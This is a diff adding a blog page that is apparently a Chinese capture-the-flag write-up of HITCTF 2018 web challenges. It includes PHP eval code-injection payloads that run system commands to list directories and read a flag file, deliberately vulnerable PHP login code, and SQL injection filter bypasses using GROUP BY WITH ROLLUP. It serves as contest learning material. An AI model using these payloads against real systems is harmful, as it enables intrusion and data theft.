@@ -1,0 +1,332 @@
+<!DOCTYPE html>
+<html lang="en">
+	<head>
+		<meta charset="utf-8">
+		<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+		<meta name="viewport" content="width=device-width, initial-scale=1">
+		 
+			
+  
+    <meta name="twitter:card" content="summary"/>
+    
+      <meta name="twitter:image" content="http://yang1k.github.io/images/avatar.png" />
+    
+  
+  
+  <meta name="twitter:title" content="HITCTF2018总结"/>
+  <meta name="twitter:description" content="caidekoujiao..
+"/>
+  
+  
+  
+  
+    <meta name="twitter:creator" content="@Yang1k"/>
+  
+
+
+
+		
+		<meta name="author" content="Yang1k">
+		<meta name="description" content="Site Description">
+		<meta name="generator" content="Hugo 0.56.0" />
+		<title>HITCTF2018总结 &middot; Yang1k</title>
+		<link rel="shortcut icon" href="http://yang1k.github.io/images/favicon.ico">
+		<link rel="stylesheet" href="http://yang1k.github.io/css/style.css">
+		<link rel="stylesheet" href="http://yang1k.github.io/css/highlight.css">
+
+		
+		<link rel="stylesheet" href="http://yang1k.github.io/css/font-awesome.min.css">
+		
+
+		
+		<link href="http://yang1k.github.io/index.xml" rel="alternate" type="application/rss+xml" title="Yang1k" />
+		
+
+		
+	</head>
+
+    <body>
+       <nav class="main-nav">
+	
+	
+		<a href='http://yang1k.github.io/'> <span class="arrow">←</span>Home</a>
+	
+	<a href='http://yang1k.github.io/post'>Archive</a>
+	<a href='http://yang1k.github.io/tags'>Tags</a>
+	<a href='http://yang1k.github.io/about'>About</a>
+
+	
+
+	
+	<a class="" href="http://yang1k.github.io/index.xml">RSS</a>
+	
+</nav>
+
+
+        <section id="wrapper" class="post">
+            <article>
+                <header>
+                    <h1>
+                        HITCTF2018总结
+                    </h1>
+                    <h2 class="headline">
+                    Feb 3, 2018 09:54
+                    · 221 words
+                    · 2 minute read
+                      <span class="tags">
+                      
+                      
+                          
+                              <a href="http://yang1k.github.io/tags/ctf">ctf</a>
+                          
+                      
+                      
+                      </span>
+                    </h2>
+                </header>
+                
+                  
+                    <div id="toc">
+                      <nav id="TableOfContents">
+<ul>
+<li>
+<ul>
+<li><a href="#babyeval">BabyEval</a></li>
+<li><a href="#babyinjection">BabyInjection</a></li>
+<li><a href="#小电影">小电影</a></li>
+</ul></li>
+</ul>
+</nav>
+                    </div>
+                  
+                
+                <section id="post-body">
+                    <p>caidekoujiao..
+<!-- more --></p>
+
+<h2 id="babyeval">BabyEval</h2>
+
+<p>右键得到源码</p>
+
+<pre><code>&lt;!--
+$str=@(string)$_GET['str'];
+blackListFilter($black_list, $str);
+eval('$str=&quot;'.addslashes($str).'&quot;;');
+--&gt;
+</code></pre>
+
+<p>可以看到关键函数eval，构造payload</p>
+
+<pre><code>http://120.24.215.80:10013/?str=${system(ls)}
+</code></pre>
+
+<p>得到的回显只有index.php。
+于是猜测falg是不是在源码中，于是构造得到index.php源码的payload</p>
+
+<pre><code>http://120.24.215.80:10013/?str=${${highlight_file(base64_decode(aW5kZXgucGhw))}}
+#aW5kZXgucGhw解码后即为index.php
+</code></pre>
+
+<p>源码</p>
+
+<pre><code>&lt;?php
+$str=@(string)$_GET['str'];
+
+function blackListFilter($black_list, $var){
+    foreach ($black_list as $b) {
+        if(stripos($var, $b) !== False){
+            die(&quot;Invaild str: $b\n&quot;);
+        }
+    }
+}
+
+$black_list = [&quot;'&quot;, '&quot;'];
+blackListFilter($black_list, $str);
+
+eval('$str=&quot;'.addslashes($str).'&quot;;');
+?&gt;
+&lt;!--
+$str=@(string)$_GET['str'];
+blackListFilter($black_list, $str);
+eval('$str=&quot;'.addslashes($str).'&quot;;');
+--&gt;
+</code></pre>
+
+<p>然而并没有，可以在翻翻其他目录，最后看到flag在根目录下
+payload</p>
+
+<pre><code>#查看目录
+http://120.24.215.80:10013/?str=${${system(base64_decode(bHMgLi4vLi4vLi4v))}}
+#查看flag
+http://120.24.215.80:10013/?str=${${system(base64_decode(Y2F0IC4uLy4uLy4uLy4uLzE2MjkyMDk3NmQ5YzA0YWM2OWUyZjQzOTJhOGNmZmJmX2ZsYWcudHh0))}}
+</code></pre>
+
+<p>注意的是base64编码时，不能将单引号(&lsquo;)也编码，否则会得不到结果。
+如下</p>
+
+<pre><code>bHMgLi4vLi4vLi4v   //ls ../../../   #可以得到回显
+
+J2xzIC4uLy4uLy4uLyc //'ls ../../../' #得不到回显
+</code></pre>
+
+<p>原因在这段代码</p>
+
+<pre><code>eval('$str=&quot;'.addslashes($str).'&quot;;');
+</code></pre>
+
+<p>这里的eval中用的是单引号包裹字符串，如果base64解码后产生单引号的话，就会和eval包裹字符串的单引号闭合，从而得不到回显。</p>
+
+<p>大佬的payload</p>
+
+<pre><code>#利用反引号执行命令。
+http://120.24.215.80:10013/index.php?str=${var_dump(`cat%20../..				/../162920976d9c04ac69e2f4392a8cffbf_flag.txt`)}
+
+</code></pre>
+
+<pre><code>#传参带入命令。
+http://120.24.215.80:10013/?str=${system($_GET[a])}&amp;a=ls ../../../
+</code></pre>
+
+<h2 id="babyinjection">BabyInjection</h2>
+
+<p>这个题
+题目给了源码</p>
+
+<pre><code>&lt;?php
+error_reporting(0);
+
+if (!isset($_POST['username']) || !isset($_POST['passwd'])) {
+    echo 'Login and get the flag';
+	echo '&lt;form action=&quot;&quot; method=&quot;post&quot;&gt;'.&quot;&lt;br/&gt;&quot;;
+	echo '&lt;input name=&quot;username&quot; type=&quot;text&quot; placeholder=&quot;username&quot;/&gt;'.&quot;&lt;br/&gt;&quot;;
+	echo '&lt;input name=&quot;passwd&quot; type=&quot;text&quot; placeholder=&quot;passwd&quot;/&gt;'.&quot;&lt;br/&gt;&quot;;
+	echo '&lt;input type=&quot;submit&quot; &gt;&lt;/input&gt;'.&quot;&lt;br/&gt;&quot;;
+	echo '&lt;/form&gt;'.&quot;&lt;br/&gt;&quot;;
+    die;
+}
+
+$flag = '';
+$filter = &quot;and|select|from|where|union|join|sleep|benchmark|,|\(|\)|like|rlike|regexp|limit|or&quot;;
+
+$username = $_POST['username'];
+$passwd = $_POST['passwd'];
+if (preg_match(&quot;/&quot;.$filter.&quot;/is&quot;,$username)==1){
+    die(&quot;Hacker hacker hacker~&quot;);
+}
+if (preg_match(&quot;/&quot;.$filter.&quot;/is&quot;,$passwd)==1){
+    die(&quot;Hacker hacker hacker~&quot;);
+}
+
+$conn = mysqli_connect();
+
+$query = &quot;SELECT * FROM users WHERE username='{$username}';&quot;;
+echo $query.&quot;&lt;br&gt;&quot;;
+$query = mysqli_query($conn, $query);
+if (mysqli_num_rows($query) == 1){
+    $result = mysqli_fetch_array($query);
+    if ($result['passwd'] == $passwd){
+        die('you did it and this is your flag: '.$flag);
+    }
+    else{
+        die('Wrong password');
+    }
+}
+else{
+    die('Wrong username');
+}
+</code></pre>
+
+<p>从代码的正则可以看到过滤了很多关键字，赛后看了一叶飘零大佬的解法，是用group by &hellip; with rollup这个mysql的用法来绕过，实验吧有一道题目用的就是这个方法。当时还记过，然而我并没有想起来。
+这里直接写payload</p>
+
+<pre><code>'=0 group by passwd with rollup having passwd &lt;=&gt; null#
+
+' || 1=1 group by passwd with rollup having passwd is null#
+</code></pre>
+
+<p>盲注payload</p>
+
+<pre><code>1' or pass&lt;''=0#
+</code></pre>
+
+<h2 id="小电影">小电影</h2>
+
+<p>利用的是ffmpeg的漏洞
+&gt; <a href="http://www.freebuf.com/vuls/138377.html">http://www.freebuf.com/vuls/138377.html</a></p>
+                </section>
+            </article>
+
+            
+                <a class="twitter" href="https://twitter.com/intent/tweet?text=http%3a%2f%2fyang1k.github.io%2fpost%2fhitctf%2f - HITCTF2018%e6%80%bb%e7%bb%93 "><span class="icon-twitter"> tweet</span></a>
+
+<a class="facebook" href="#" onclick="
+    window.open(
+      'https://www.facebook.com/sharer/sharer.php?u='+encodeURIComponent(location.href),
+      'facebook-share-dialog',
+      'width=626,height=436');
+    return false;"><span class="icon-facebook-rect"> Share</span>
+</a>
+
+            
+
+            
+                <div id="disqus_thread"></div>
+<script type="text/javascript">
+    var disqus_shortname = 'your_disqus_short_name'; 
+
+     
+    (function() {
+        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+</div>
+
+            
+
+            
+
+            <footer id="footer">
+    
+    <p class="small">
+    
+       © Copyright 2019 <i class="fa fa-heart" aria-hidden="true"></i> Yang1k
+    
+    </p>
+    <p class="small">
+        Powered by <a href="http://www.gohugo.io/">Hugo</a> Theme By <a href="https://github.com/nodejh/hugo-theme-cactus-plus">nodejh</a>
+    </p>
+</footer>
+
+        </section>
+
+        <script src="http://yang1k.github.io/js/jquery-3.3.1.min.js"></script>
+<script src="http://yang1k.github.io/js/main.js"></script>
+<script src="http://yang1k.github.io/js/highlight.min.js"></script>
+<script>hljs.initHighlightingOnLoad();</script>
+
+
+
+
+  
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+	ga('create', 'your_google_analytics_id', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+
+
+
+
+
+    </body>
+</html>
